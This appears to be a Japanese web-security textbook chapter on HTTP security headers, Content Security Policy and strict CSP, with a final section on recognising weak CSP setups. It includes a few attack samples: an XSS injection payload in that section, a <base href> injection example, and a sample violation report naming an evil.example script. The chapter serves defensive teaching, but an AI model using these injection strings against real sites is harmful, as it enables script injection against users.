ページが`<iframe>`・`<frame>`・`<embed>`・`<object>`で他ページに埋め込まれることを制御するヘッダである。これがないと、攻撃者が正規サイトを透明な（`opacity:0`などの）iframeでオーバーレイし、ユーザーには別の見た目のボタンを見せながら、実際には正規サイトの重要な操作ボタンをクリックさせるクリックジャッキング（Clickjacking／UI Redressing）攻撃が成立しうる。`DENY`はいかなるフレームからの埋め込みも拒否し、`SAMEORIGIN`は同一オリジンからの埋め込みのみ許可する。なお、X-Frame-Optionsは仕様として単一オリジンしか許可リストに指定できない制約があり、より柔軟な制御にはCSPの`frame-ancestors`ディレクティブ（例: `Content-Security-Policy: frame-ancestors 'self' https://partner.example.com`）が推奨される。両方を併記しておくと、CSP未対応の古いブラウザに対するフォールバックとして機能する。

#### X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

ブラウザのMIMEタイプスニッフィング（宣言されたContent-Typeを無視して、レスポンスの中身のバイト列から実際のファイル種別を推測する挙動）を無効化するヘッダである。スニッフィングが有効だと、たとえばアップロードされたテキストファイルの中身がHTMLやJavaScriptとして解釈可能な形になっていた場合、サーバーが`Content-Type: text/plain`と宣言していても、ブラウザが中身を見て「これはHTMLだ」と判断し実行してしまうことがある。これは、ユーザーがアップロードした一見無害なファイル（画像やテキスト）をHTMLとして誤解釈させ、格納型XSSを成立させる経路になりうる。`nosniff`はこの推測処理を止め、サーバーが宣言したContent-Typeを厳密に信頼させる。

#### Content-Security-Policy (CSP)

CSPはコンテンツの読み込み元をディレクティブ単位で許可リスト化し、インラインスクリプトの実行を制限するなどしてXSSの被害を大幅に緩和する仕組みである。OWASPのチートシートでは詳細な設計は専用のCSPチートシートに譲っているが、HTTP Headersチートシートの文脈では「インラインJavaScriptを無効化することでDOM操作やイベントハンドラ経由の攻撃を防止する」点が要点として挙げられている。CSPはこの教科書の他章で詳細に扱う前提のため、ここでは「Cookie・ヘッダの防御層の一つとして併用すべきもの」という位置づけに留める。

#### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```

`Referer`ヘッダ（ブラウザがリンク元のURLをリクエスト先に伝えるヘッダ、仕様上のスペル間違いがそのまま定着している）の送信範囲を制御する。`strict-origin-when-cross-origin`は、同一オリジンへの遷移では完全なURL（パスやクエリ文字列含む）を送るが、クロスオリジンへの遷移ではオリジン部分のみ（パスやクエリを含まない）に切り詰め、さらにHTTPSからHTTPへのダウングレードが伴う遷移ではReferer自体を送らないという挙動になる。これが重要なのは、URLのクエリ文字列にセッショントークンやパスワードリセットトークン、個人情報などが含まれるケースがしばしばあり、外部サイトへのリンクを踏んだ際にそれらが第三者のサーバーログに残ってしまう「Referer経由のトークン漏えい」を防ぐためである。

#### Permissions-Policy（旧Feature-Policy）

```
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

カメラ、マイク、位置情報、フルスクリーンなどブラウザの強力な機能に対するオリジン単位のアクセス許可を制御する。空の許可リスト`()`は「どのオリジンにも許可しない」ことを意味する。この防御が効くシナリオとして、たとえページ内にXSSが成立してJavaScriptが自由に実行できたとしても、Permissions-Policyでカメラ・マイクの利用が明示的に禁止されていれば、攻撃者スクリプトが`getUserMedia()`を呼び出してもブラウザ側でブロックされ、盗聴・盗撮のような二次被害には発展しない。多層防御（defense in depth）の一例である。

#### クロスオリジン分離系ヘッダ: COOP / COEP / CORP

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-site
```

この3つは、SpectreのようなCPUの投機的実行を悪用したサイドチャネル攻撃（プロセス間のメモリ境界を越えて秘密データを読み出す攻撃）に対する防御として整備された、比較的新しい世代のヘッダ群である。ブラウザは通常、プロセス分離（サイトごとに別プロセスで描画する、いわゆるSite Isolation）によってオリジンをまたいだメモリアクセスを防いでいるが、Spectre系の攻撃はこの分離を回避しうる。COOP（`same-origin`）はトップレベルウィンドウが他オリジンの`window.opener`経由の参照を持たないようにし、ブラウジングコンテキストグループを分離する。COEPは埋め込むリソースに明示的なクロスオリジン許可（CORPヘッダまたはCORS）を要求し、無許可のクロスオリジンリソース読み込みをブロックする（例外的に、個々のリソースタグに`crossorigin`属性を付与することでCORS経由の読み込みは許可できる）。CORP（`same-site`）は逆に、自分のリソースがどのオリジンから読み込まれてよいかを宣言する側のヘッダであり、他サイトからの無断埋め込み（例: 画像の直リンクや動画の埋め込み）を制限する。COOPとCOEPを両方有効にしてクロスオリジン分離状態（`crossOriginIsolated`）を達成すると、`SharedArrayBuffer`のような高精度タイマーを構成しうる強力なAPIを安全に使えるようになる、という表裏の関係もある。

#### Cache-Control

```
Cache-Control: no-store
```

認証情報や個人情報を含むレスポンスに対しては`no-store`を指定し、ブラウザにも中間キャッシュ（プロキシ、CDNなど）にも一切キャッシュさせない。これがないと、共有端末やブラウザの「戻る」操作、あるいはキャッシュサーバー上に機微な情報を含むレスポンスが残留し、後から別のユーザーやローカルアクセス権を持つ者に閲覧される可能性がある。似た値に`private`（共有キャッシュには保存させないがブラウザローカルキャッシュは許可）、`no-cache`（キャッシュ自体は許可するが再利用前にサーバーへの検証を必須にする、実質的には「無条件キャッシュ禁止」に近い）があり、用途に応じて使い分ける。

#### 情報漏えい系ヘッダの削除

```
Server: webserver
```

`Server`ヘッダや`X-Powered-By`ヘッダは、稼働しているミドルウェアやフレームワークのバージョン情報を露出させ、攻撃者が既知の脆弱性（CVE）を突き合わせて攻撃対象を絞り込む助けになってしまう。OWASPのチートシートでは、これらのヘッダを削除するか、`Server: webserver`のような無意味な値に上書きすることを推奨している。.NET環境における`X-AspNet-Version`ヘッダも同様の理由で、`web.config`の`<httpRuntime enableVersionHeader="false" />`設定や、グローバルの`MvcHandler.DisableMvcResponseHeader = true`によって無効化することが推奨されている。

なお`X-XSS-Protection`ヘッダ（古いブラウザのXSSフィルタを有効化するもの）は`X-XSS-Protection: 0`で明示的に無効化することがOWASPの現在の推奨である。理由は、このフィルタ機構自体がInternet Explorerなど旧世代ブラウザにのみ実装されており、モダンブラウザ（Chrome、Firefoxなど）ではすでに廃止済みである上、フィルタの実装不備がかえって新種のXSS（フィルタ自体の挙動を悪用したもの）を生み出す事例が過去に報告されたためである。現在はCSPによるXSS対策への一本化が推奨されている。

#### サーバー・フレームワーク別の実装例

OWASPのチートシートは、同じヘッダをどう設定するかを主要なサーバー・フレームワークごとに示している。X-Frame-Optionsを例に引用する。

```apache
<IfModule mod_headers.c>
   Header unset X-Frame-Options
   Header always set X-Frame-Options "DENY"
</IfModule>
```

```nginx
add_header "X-Frame-Options" "DENY" always;
```

```javascript
const helmet = require('helmet');
const app = express();
app.use(helmet.frameguard({action: "sameorigin"}));
```

Node.js/ExpressではHelmetのようなミドルウェアライブラリを使うと、この章で挙げたヘッダの多くをまとめて安全なデフォルト値で付与できる。設定を個別に手書きするよりも、こうした実績のあるライブラリのデフォルト設定に乗る方が、指定漏れや値の誤りによる防御の穴を減らせる。

#### 廃止されたヘッダへの注意

`Expect-CT`ヘッダと`Public-Key-Pins`（HPKP）ヘッダは、OWASPのチートシートで明確に「使用しない」ことが推奨されている。HPKPは証明書のピン留めをブラウザに強制する仕組みだったが、運用ミスでピン留めした鍵をすべて紛失するとサイトへのアクセスが完全に不能になるリスクが大きく、Chromiumは2018年に対応を削除し、現在主要ブラウザはいずれも未対応である。証明書の信頼性検証は、現在ではCertificate Transparency（証明書発行の透明性ログ）とCAA DNSレコード（そのドメインに対して証明書を発行してよい認証局を制限する仕組み）による代替策に移行している。バージョン依存の強い分野なので、教科書や記事を読む際は「いつの情報か」を必ず確認する習慣が重要である。

> 出典: OWASP HTTP Headers Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html

### 4. まとめ: Cookie属性とヘッダの防御はどう組み合わさるか

この章で扱った属性・ヘッダは、単独では特定の攻撃ベクトルにしか効かないが、組み合わせることで層になった防御（defense in depth）を構成する。典型的なセッションCookieの安全な発行例をまとめると、次のようになる。

```
Set-Cookie: session_id=<ランダムな高エントロピー値>; Secure; HttpOnly; SameSite=Lax; Path=/
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: frame-ancestors 'self'; script-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Cross-Origin-Opener-Policy: same-origin
```

Secureは盗聴者による平文窃取を防ぎ、HttpOnlyはXSS成立時のCookie直接窃取を防ぎ、SameSiteはCSRFおよびクロスサイトでの意図しないセッション利用を防ぎ、HSTSはそもそも平文接続自体を発生させないようにし、X-Frame-Options/CSPのframe-ancestorsはクリックジャッキングを防ぎ、COOPはクロスオリジンのウィンドウ参照を断ち切る。クライアントサイド脆弱性のハンティングにおいては、これらの設定の「どれが欠けているか」「どこまで緩められているか」を確認することが、XSSやCSRF、クリックジャッキングといった個別の脆弱性が実際にどこまでの被害に発展しうるかを見積もる第一歩になる。逆に防御側の視点では、ここに挙げたヘッダとCookie属性を漏れなく設定することが、個々のコード脆弱性を潰すのとは独立した、もう一段のセキュリティ境界を作ることになる。

## Content Security Policy の基礎とstrict CSP

### この節で扱うこと

Content Security Policy（CSP、コンテンツセキュリティポリシー）は、ブラウザに「このページはどこから来たリソースだけを信頼して実行・読み込みしてよいか」を宣言することで、XSS（クロスサイトスクリプティング）の**影響範囲を縮小する**ための多層防御機構です。入力バリデーションや出力エンコーディングに代わるものではなく、それらが破られたときの「最後の砦」として機能します。

本節では、CSPの基本的な仕組みから、現在のベストプラクティスである「strict CSP（nonceまたはhashベースのポリシー）」の具体的な実装、そして実装時に踏みがちな落とし穴までを、原典（web.dev の CSP解説、OWASP Cheat Sheet Series）に基づいて解説します。

---

### 1. CSPの基本モデル：allowlist（許可リスト）による制御

CSPは、HTTPレスポンスヘッダーまたは `<meta>` タグでブラウザに送られる**ポリシー文字列**です。ポリシーは「ディレクティブ（directive、制御対象のリソース種別を指定するキーワード）」と「ソース（そのディレクティブに対して許可する取得元）」の組で構成されます。

```
Content-Security-Policy: script-src 'self' https://apis.google.com
```

このヘッダーは「このページで実行されるスクリプトは、自分自身のオリジン（`'self'`）と `https://apis.google.com` からのものだけを許可する」という意味です。ブラウザはHTMLパーサ・スクリプトローダのレベルでこの制約を強制するため、たとえ攻撃者が `<script>` タグをHTML内に注入できても（＝XSSに成功しても）、そのスクリプトのソースがallowlistに含まれていなければ**実行されずにブロック**されます。これがCSPが「XSSの影響を軽減する」と言われる理由の核心です。

> 出典: Content security policy — https://web.dev/articles/csp

#### 主要ディレクティブ一覧

| ディレクティブ | 制御対象 |
|---|---|
| `script-src` | JavaScriptの実行元 |
| `script-src-elem` | `<script>` 要素として読み込まれるスクリプト（CSP3で追加された細分化） |
| `script-src-attr` | `onclick` 等のインラインイベントハンドラ |
| `style-src` | CSS（スタイルシート）の読み込み元 |
| `img-src` | 画像の読み込み元 |
| `font-src` | Webフォントの読み込み元 |
| `connect-src` | `fetch`/`XMLHttpRequest`/`WebSocket`/`EventSource` の接続先 |
| `media-src` | 動画・音声の読み込み元 |
| `object-src` | `<object>`/`<embed>`/`<applet>`（プラグイン系）の実行元 |
| `frame-src` / `child-src` | `<iframe>` に読み込めるコンテンツ元 |
| `frame-ancestors` | 自分自身を `<iframe>` 等で埋め込むことを許可する親ページのオリジン（クリックジャッキング対策） |
| `base-uri` | `<base>` 要素で指定できるURLの制限 |
| `form-action` | `<form>` の送信先URLの制限 |
| `default-src` | 個別指定がないディレクティブへのフォールバック値 |
| `worker-src` | Web Worker / Service Worker のスクリプト取得元 |
| `upgrade-insecure-requests` | HTTPリクエストを自動的にHTTPSへ書き換える |
| `report-uri` / `report-to` | ポリシー違反をレポートする送信先 |

重要な仕組み上の注意点として、**「指定されなかったディレクティブは `default-src` にフォールバックするが、一度でも明示的に指定したディレクティブはフォールバックしない」**という規則があります。たとえば `default-src 'none'; script-src 'self';` と書いた場合、`img-src` は指定されていないので `default-src 'none'` の効果を受けて全画像がブロックされますが、`script-src` は明示指定されているため `default-src` の値とは独立に評価されます。これを誤解して「`default-src` を厳しくすれば全部安全」と思い込むと、個別ディレクティブの記述漏れに気づけません。

> 出典: OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

また `frame-ancestors` と `sandbox`、そしてレポート系ディレクティブ（`report-uri`/`report-to`）は、後述する `<meta>` タグ経由の配信では**機能しません**。これはブラウザの仕様上、これらのディレクティブがHTTPレスポンスのナビゲーション処理（フレーム内に読み込まれる前の判定）に関わるため、DOM構築後に評価される `<meta>` タグでは間に合わないという実装上の制約です。

---

### 2. なぜ `'unsafe-inline'` はXSS対策として無意味になるのか

CSP導入以前のWebページでは、次のようにHTML内に直接スクリプトを書く「インラインスクリプト」が一般的でした。

```html
<script>
  function doAmazingThings() {
    alert('YOU ARE AMAZING!');
  }
</script>
<button onclick='doAmazingThings();'>Am I amazing?</button>
```

CSPはデフォルトで、`script-src` にソースを1つでも指定すると**インラインスクリプトとインラインイベントハンドラを自動的にブロック**します。これは「XSSの注入先の多くはインラインスクリプトである」という前提に基づいた設計です。攻撃者が `<script>alert(1)</script>` をページに注入できても、CSPがインラインスクリプトを許可していなければブラウザはそれを実行しません。

しかし、既存コードとの互換性のために `'unsafe-inline'` キーワードを `script-src` に加えると、この防御は完全に無効化されます。

```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

この設定では、攻撃者が注入したインラインスクリプトも「インラインスクリプトである」という理由だけで実行が許可されてしまい、CSPが本来防ぐべき攻撃をそのまま通してしまいます。同様に `'unsafe-eval'` を許可すると、`eval()` や `new Function()`、文字列を渡す形の `setTimeout("code", n)` を通じた動的コード実行を許可することになり、攻撃者が文字列注入経由でコードを実行できる経路が残ります。

**CSP準拠への書き換え例**（インラインコードの外部ファイル化）：

```html
<!-- 変更前：インラインで危険 -->
<script>
  function doAmazingThings() { alert('YOU ARE AMAZING!'); }
</script>
<button onclick='doAmazingThings();'>Am I amazing?</button>
```

```html
<!-- 変更後：外部スクリプト + addEventListener -->
<script src='amazing.js'></script>
<button id='amazing'>Am I amazing?</button>
```

```javascript
// amazing.js
function doAmazingThings() {
  alert('YOU ARE AMAZING!');
}
document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('amazing')
    .addEventListener('click', doAmazingThings);
});
```

`eval()` を使う文字列渡しのタイマー処理も同様に書き換えます。

```javascript
// 変更前：文字列を渡すとCSPでブロックされる（内部的にeval相当の処理を伴う）
setTimeout("document.querySelector('a').style.display = 'none';", 10);

// 変更後：関数を渡す
setTimeout(function () {
  document.querySelector('a').style.display = 'none';
}, 10);
```

JSON文字列のパースに `eval()` を使っているコードも、`JSON.parse()` に置き換えることで `unsafe-eval` への依存を減らせます。

> 出典: Content security policy — https://web.dev/articles/csp

---

### 3. strict CSP：nonceベースとhashベース

allowlist方式（`script-src https://cdn-a.example https://cdn-b.example ...`）には根本的な弱点があります。allowlistに含まれるドメインの中に、JSONPエンドポイントや古いライブラリバージョンなど「任意のJavaScriptを実行させられる抜け道」を持つものが1つでもあれば、攻撃者はそのドメインを踏み台にしてCSPをバイパスできてしまいます。実際に大手CDNやアナリティクスサービスのドメインを使ったバイパスが繰り返し報告されてきました。

そこでGoogleが提唱し、現在のベストプラクティスとなっているのが**strict CSP**です。ドメイン単位の信頼ではなく、「そのスクリプトタグ自体が正当かどうか」を検証する方式に転換します。実装方法は2通りあります。

#### (a) nonceベース

`nonce`（number used once、一度限りの値）は、サーバーが**リクエストごとに新規生成する予測不可能なランダム値**です。CSPヘッダーとHTML内の `<script>` タグの両方に同じ値を埋め込みます。

```
Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

```html
<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">
  // このスクリプトは正しいnonceを持つため実行される
</script>
```

**仕組みレベルでの理解**：ブラウザはHTMLパーサが `<script>` 要素を解釈する際に、その要素の `nonce` 属性値がCSPヘッダーで宣言された値と一致するかを照合します。一致すれば実行、しなければブロックです。攻撃者がXSS経由でHTMLに `<script>` タグを注入できたとしても、レスポンスごとに変わる正しいnonce値を**知る手段がなければ**そのスクリプトは実行されません（反射型XSSでレスポンス自体にnonceが漏れる特殊なケースを除く）。

重要な実装上の警告として、OWASPは次のように強調しています。「攻撃者が注入したスクリプトにもnonceが付いてしまうような、全ての `<script>` タグを一括置換するミドルウェアを作ってはいけない」。つまり、テンプレートエンジンの外側で正規表現的に `<script>` を `<script nonce="...">` に書き換えるような実装をすると、攻撃者がHTMLに注入した `<script>` タグにも同じミドルウェアがnonceを付与してしまい、strict CSPの意味が失われます。**nonceは、信頼できるテンプレートエンジンが「開発者が書いたスクリプトタグ」だけに、レンダリング時点で個別に埋め込む必要があります。**

#### (b) hashベース

スクリプトの中身のSHA-256ハッシュ値を計算し、それをCSPヘッダーに列挙する方式です。

```html
<script>alert('Hello, world.');</script>
```

```
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
```

ハッシュはスクリプトタグの**中身のバイト列**（開始・終了タグ自体は含まない）に対して計算されます。大文字小文字、空白（前後の空白を含む）が1文字でも異なればハッシュ値は変わり、そのスクリプトは実行されなくなります。正確なハッシュ値は、Chrome DevToolsのConsoleタブに表示されるCSP違反メッセージ（"Refused to execute inline script because it violates the following Content Security Policy directive..."）内に推奨値として表示されるほか、`report-uri.com/home/hash` のような外部ツールでも生成できます。

OWASPはhash方式について明確なリスクを指摘しています。「スクリプトタグの中身を少しでも変更する（フォーマット整形による空白の変化ですら）とハッシュが変わり、スクリプトが描画されなくなる」ため、**ビルドパイプラインやコード整形ツールが介在する環境では保守コストが高くなりがち**です。CI/CDでミニファイのたびにハッシュを再計算する仕組みが必要になります。

#### `strict-dynamic`：動的に生成されるスクリプトへの伝播

nonceやhashで許可されたスクリプト（トップレベルスクリプト）が、実行時に `document.createElement('script')` などで**新たに** `<script>` 要素を生成する場合、その子スクリプトにもnonce/hashを個別に付与するのは非現実的です（多くのライブラリローダーがこのパターンを使います）。この問題を解決するのが `strict-dynamic` キーワードです。

```
script-src 'nonce-{RANDOM}' 'strict-dynamic';
```

`strict-dynamic` を指定すると、「正しいnonce/hashを持つスクリプトが自身のロジックでロードした追加のスクリプト」は自動的に信頼されます。仕組みとしては、ブラウザが「信頼されたスクリプト実行コンテキストから発行された `createElement('script')` 呼び出し」を追跡し、そこから生成された要素の実行を許可する、という実行コンテキストの伝播モデルです。これにより、モジュールバンドラやタグマネージャのような「動的スクリプト読み込みを行うが個々の子スクリプトのハッシュは予測できない」構成でもstrict CSPを適用できます。

なお `strict-dynamic` が有効な場合、`script-src` に書かれたホスト名ベースのallowlist（`https://apis.google.com` など）は**無視されます**（対応ブラウザ上では、nonce/hashとstrict-dynamicの組み合わせが優先される）。これは仕様上意図された挙動で、ドメイン単位の信頼を意図的にスクリプト単位の信頼に置き換えるためです。

> 出典: Content security policy — https://web.dev/articles/csp / OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

---

### 4. strict CSPの推奨テンプレートと `object-src` / `base-uri`

OWASP Cheat Sheetが示す、現在推奨されるstrict CSPの型は次の2つです。

```
# nonceベースのstrict CSP
script-src 'nonce-{RANDOM}' 'strict-dynamic';
object-src 'none';
base-uri 'none';
```

```
# hashベースのstrict CSP
script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
object-src 'none';
base-uri 'none';
```

`script-src` 以外の2行が付随する理由を仕組みレベルで説明します。

- **`object-src 'none'`**：`<object>`/`<embed>`/`<applet>` はFlashやJavaアプレットなど、ブラウザの通常のスクリプト実行モデルの外側で任意コードを実行できるレガシーなプラグイン機構の入り口です。これらは `script-src` の制御対象外であるため、`script-src` をどれだけ厳格にしても `object-src` を放置すると、プラグイン経由でCSPをすり抜けてスクリプト相当の処理を実行される余地が残ります。strict CSPでは無条件に `'none'` にします。
- **`base-uri 'none'`**：HTMLの `<base href="...">` は、そのページ内の相対URL（`<script src="app.js">` など）の解決基準を変更します。攻撃者が `<base href="https://attacker.example/">` をXSSで注入できると、正規のnonce/hash検証を通過した相対パスの `<script src="app.js">` が、実際には攻撃者のサーバーから読み込まれてしまいます。ホスト名ベースのallowlistではこの経路をブロックできないため、strict CSPでは `base-uri` も明示的にロックダウンします。

このテンプレートには意図的に `default-src` が含まれていません。strict CSPはあくまで「スクリプト実行」の防御に特化しており、画像やスタイルなど他のリソース種別は別途、サイトの実情に応じて `img-src`・`style-src` 等を個別に設定する運用が想定されています。

---

### 5. レポート機能：`report-uri` と `report-to`

CSP違反が発生した際、ブラウザに違反内容をサーバーへ通知させることができます。これにより本番投入前の影響調査や、投入後の継続的な監視が可能になります。

#### レガシー方式：`report-uri`

```
Content-Security-Policy: default-src 'self'; report-uri /csp-report-handler
```

違反発生時にブラウザが送信するレポートの例：

```json
{
  "csp-report": {
    "document-uri": "http://example.org/page.html",
    "referrer": "http://evil.example.com/",
    "blocked-uri": "http://evil.example.com/evil.js",
    "violated-directive": "script-src 'self' https://apis.google.com",
    "original-policy": "script-src 'self' https://apis.google.com; report-uri /handler"
  }
}
```

`blocked-uri`（ブロックされたリソースのURL）や `violated-directive`（違反したディレクティブ）から、意図しない外部リソースの混入やXSS試行の痕跡を検知できます。

#### 現行方式：`report-to`（CSP Level 3）

`report-to` はブラウザの Reporting API と連携する仕組みで、`Report-To`（または新しい `Reporting-Endpoints`）ヘッダーで事前に定義したエンドポイントグループ名を参照します。JSON形式でより多くのメタデータを含むレポートを送信できます。ただし対応状況の差があるため、OWASPは移行期の実装として**両方を併記する**ことを推奨しています。

```
Content-Security-Policy: default-src 'self'; report-to csp-endpoint; report-uri https://example.com/csp-reports
```

`report-to` に対応するブラウザはそちらを使用し、対応していない古いブラウザは `report-uri` にフォールバックします。

#### Report-Onlyモード：本番影響ゼロでの事前検証

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /handler
```

`Content-Security-Policy-Report-Only` ヘッダーを使うと、ポリシーに違反するリソースを**ブロックせずに**レポートだけを送信します。これは「fail open（違反があっても処理を止めない）」な動作であり、strict CSPを本番の強制ポリシーとして投入する前に、既存ページのどの部分が違反するかを洗い出す段階的導入に使います。ブラウザは `Content-Security-Policy` と `Content-Security-Policy-Report-Only` を同時に送ることをサポートしているため、「厳格なポリシーをReport-Onlyで先行検証しつつ、緩いポリシーを実運用で強制する」という並行運用も可能です。

> 出典: OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

---

### 6. 配信方法の違い：HTTPヘッダー vs `<meta>` タグ

CSPは2通りの方法でブラウザに伝達できます。

**HTTPヘッダー方式（推奨）**

```
Content-Security-Policy: default-src 'self'
```

すべてのディレクティブに対応し、レスポンスの最初のバイトを受信した時点からブラウザにポリシーが伝わるため、パース開始前の早い段階で保護が有効になります。CDNやアプリケーションサーバーでヘッダーを制御できる環境ではこちらを使うべきです。

**`<meta>` タグ方式（代替手段）**

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src https://cdn.example.net; child-src 'none'; object-src 'none'">
```

静的ホスティングなどHTTPヘッダーを制御できない環境向けの代替手段ですが、前述の通り `frame-ancestors`・`sandbox`・レポート系ディレクティブ（`report-uri`/`report-to`）は機能しません。これはブラウザの実装が、これらのディレクティブをHTML文書がパースされる前のナビゲーション判定やネットワークレイヤーの処理として扱っているためで、DOM内に埋め込まれた `<meta>` タグの評価タイミングでは間に合わないという構造的な制約です。攻撃者がXSSで `<meta>` タグを追加でDOMに注入することでポリシーを上書き（正確には追加のポリシーとして重畳）できてしまう可能性がある点も、ヘッダー方式より脆弱な理由の一つです。

> 出典: Content security policy — https://web.dev/articles/csp / OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

---

### 7. よくある設定ミスとバイパスに関する注意点

#### 廃止済みヘッダーの使用

`X-Content-Security-Policy` や `X-WebKit-CSP` は、Firefox 23／Chrome 25（いずれも2013年前後）で標準の `Content-Security-Policy` ヘッダーがサポートされて以降、実装が不完全かつ不整合であるとして**使用が非推奨**です。現在のモダンブラウザは `Content-Security-Policy` ヘッダーのみを対象に実装しており、プレフィックス付きヘッダーは無視されるか誤動作します。

#### 廃止されたディレクティブの残存

`prefetch-src` はCSP Level 3の仕様策定過程で削除された実験的ディレクティブで、モダンブラウザでは無視されます。古い設定例をそのままコピーすると、意図した制御が実は効いていないという状況になり得ます。

#### 単独防御としての過信

OWASPは明確に「CSPをXSSに対する唯一の防御機構として頼るべきではない」と述べています。CSPはブラウザ側の実装差異、`unsafe-inline`/`unsafe-eval` を必要とするレガシーコードの残存、allowlistに含まれるドメインの脆弱性など、様々な理由で完全ではありません。入力バリデーション・出力エンコーディングといった根本的なXSS対策（Cross-Site Scripting Prevention Cheat Sheetの範囲）と併用することが前提です。

#### Subresource Integrity（SRI）との組み合わせ

完全に静的なサイトであっても、CSPで**Subresource Integrity（サブリソース完全性、外部リソースのハッシュ検証）**の使用を強制できます。これは、サードパーティのJavaScript配信元（CDNなど）が侵害された場合に、改ざんされたスクリプトの実行を防ぐ効果があります。`script-src` のallowlistに含めた外部ドメイン自体が攻撃者に侵害された場合の保険として機能します。

> 出典: OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

---

### 8. ブラウザサポートとバージョンに関する補足

CSPは策定時期の異なる複数のレベルがあります。

- **CSP Level 1 / Level 2**：Chrome 25以降、Firefox 23以降、Safari 7以降、Edge 14以降でサポートされているW3C勧告標準で、`script-src`、`nonce`、`hash`、`frame-ancestors` などの基本機構はこの時点で利用可能です。
- **CSP Level 3**：`strict-dynamic`、`worker-src`、`report-to`、`script-src-elem`/`script-src-attr` などの細分化ディレクティブを含みますが、本稿執筆時点でも実装状況にはブラウザ間で差があるため、対象ブラウザで動作検証を行うべきです。

strict CSP（nonce/hash + `strict-dynamic`）は比較的新しいブラウザでの利用を前提としており、`strict-dynamic` 非対応の古いブラウザではホスト名ベースのallowlistへのフォールバック記述を併記する設計が一般的です（`strict-dynamic` に対応したブラウザはallowlist部分を無視し、非対応ブラウザはallowlistを使う、という後方互換の書き方）。導入時は自組織が対象とするブラウザの最小バージョンを明記し、フォールバックの要否を都度判断する必要があります。

---

### まとめ

- CSPは「どこから来たリソースを実行・読み込みしてよいか」をブラウザに宣言する、allowlistベースの多層防御であり、XSSの検知ではなく**影響軽減**を目的とする。
- `'unsafe-inline'`/`'unsafe-eval'` を許可すると、CSPの主要な防御効果（インラインスクリプト・動的コード実行のブロック）が失われる。
- 現在のベストプラクティスは、ドメイン単位のallowlistではなく、nonceまたはhashで「そのスクリプトタグ自体」を検証する**strict CSP**であり、`strict-dynamic` と `object-src 'none'; base-uri 'none';` を伴うのが定型。
- nonceはリクエストごとに再生成する必要があり、一括置換ミドルウェアでの実装は攻撃者の注入スクリプトにもnonceを与えてしまうため危険。hashは中身の完全一致が必要でビルドパイプラインとの相性に注意する。
- `report-to`/`report-uri` による違反レポートと `Content-Security-Policy-Report-Only` による段階的導入を組み合わせることで、本番影響を抑えつつCSPを安全に強化できる。
- `<meta>` タグ配信は `frame-ancestors`・`sandbox`・レポート系ディレクティブが機能しないため、可能な限りHTTPヘッダーでの配信を優先する。
- CSPは唯一の防御ではなく、入力バリデーション・出力エンコーディング・SRIと組み合わせた多層防御の一部として運用する。

## CSPの弱い構成を見抜く（bypass技法の理解）

Content Security Policy（CSP）は、ブラウザに対して「どのオリジンから、どの種類のリソース（スクリプト・スタイル・画像・iframe など）を読み込み・実行してよいか」を宣言する防御機構である。HTTPレスポンスヘッダ `Content-Security-Policy`、または `<meta http-equiv="Content-Security-Policy">` で指定する。重要な前提として、**CSPはXSS（クロスサイトスクリプティング）を「起きなくする」ものではなく、「起きても被害の実行を抑える」二次防御層**である。入力検証や出力エスケープの代替にはならない。

本節の目的は防御である。CSPを設計・レビューする立場から「なぜこの構成だと保護が骨抜きになるのか」を、ブラウザのパーサやディレクティブの評価アルゴリズムの挙動レベルで理解し、レビュー時に弱い構成を検出できるようになることを狙う。実在サービスへの無許可検証や攻撃実行は扱わない。すべてのペイロード例は、自分が管理する検証環境で構成の穴を確認するための最小サンプルである。

### CSPが「効く／効かない」を決める仕組み

CSPの中核は **fetch directive（取得ディレクティブ）** 群である。代表格は `script-src`（スクリプトの読み込み元・実行方法を制御）で、`default-src` は個別指定のないディレクティブのフォールバックとして働く。ブラウザはリソースを読み込む直前に、そのリソースの種類に対応するディレクティブの「ソースリスト」を評価し、**マッチするソースが1つでもあれば許可、なければブロック**する。

ここで「見抜く」ための第一原理は次の3点である。

1. **ディレクティブが存在しないと、そのリソース種は `default-src` にフォールバックする。`default-src` すらなければ完全に無制限**になる。つまり「書いていないディレクティブ」は最大の穴になりうる。
2. **ソースリストに1つでも緩いソース（`'unsafe-inline'`、`*`、`data:`、信頼しすぎたドメイン）が混じると、他の厳格なソース指定は意味を失う**。CSPはAND条件ではなくOR条件（いずれかにマッチすれば許可）だからである。
3. **`script-src` が厳格でも、`base-uri` や `object-src` など「スクリプト実行の別経路」を塞いでいないと迂回できる**。

この3点を軸に、以下で類型を見ていく。

### 類型1：`'unsafe-inline'` — インラインスクリプトを丸ごと許可

もっとも典型的な弱い構成。次のようなポリシーを考える。

```
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*
```

ここに、たとえば属性値へのHTML注入点があれば、次で実行できる。

```html
"/><script>alert(1337);</script>
```

